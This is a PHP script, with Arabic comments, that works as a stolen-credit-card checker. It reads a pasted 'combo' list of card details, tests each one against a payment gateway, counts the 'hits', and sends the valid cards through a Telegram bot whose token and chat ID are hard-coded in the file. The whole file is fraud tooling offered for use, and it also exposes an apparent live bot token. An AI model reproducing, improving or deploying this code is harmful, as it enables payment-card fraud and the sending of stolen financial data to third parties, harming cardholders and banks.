<?php

include 'gate_config.php';


$telegramToken = '7329997982:AAGSvVQ45a7TzXw0NCe_a9qmOzis3rSaaro';
$telegramChatID = '7312999465';


function sendTelegramMessage($chatID, $message, $token) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=" . urlencode($message);
    file_get_contents($url);
}

// دالة لفحص البطاقة
function checkCard($cardDetails) {
    // استخدام إعدادات البوابة المضمنة من الملف
    $response = performRequest($cardDetails);
    $response = json_decode($response, true);

    if (isset($response['valid']) && $response['valid'] === true) {
        return true;
    } else {
        return false;
    }
}

try {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $combo = $_POST['combo'];
        $telegramToken = $_POST['telegram_token'];
        $telegramChatID = $_POST['telegram_chat_id'];

        $cards = explode("\n", $combo);
        $validCards = [];
        $failedCards = [];
        $total = 0;
        $hits = 0;
        $errors = 0;

        foreach ($cards as $card) {
            $total++;
            if (checkCard(trim($card))) {
                $validCards[] = $card;
                $hits++;
            } else {
                $failedCards[] = $card;
                $errors++;
            }
        }

        if (!empty($telegramToken) && !empty($telegramChatID)) {
            $message = "Valid Cards:\n" . implode("\n", $validCards);
            sendTelegramMessage($telegramChatID, $message, $telegramToken);
        }

        echo "<h1>Results</h1>";
        echo "<h2>Valid Cards:</h2>";
        echo "<pre>" . implode("\n", $validCards) . "</pre>";
        echo "<h2>Failed Cards:</h2>";
        echo "<pre>" . implode("\n", $failedCards) . "</pre>";
        echo "<h2>Total Checked: $total</h2>";
        echo "<h2>Hits: $hits</h2>";
        echo "<h2>Errors: $errors</h2>";
    } else {
        http_response_code(405);
        sendTelegramMessage($telegramChatID, "Error: Method not allowed", $telegramToken);
        echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    }
} catch (Exception $e) {
    sendTelegramMessage($telegramChatID, "Error: " . $e->getMessage(), $telegramToken);
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Internal server error']);
}
?>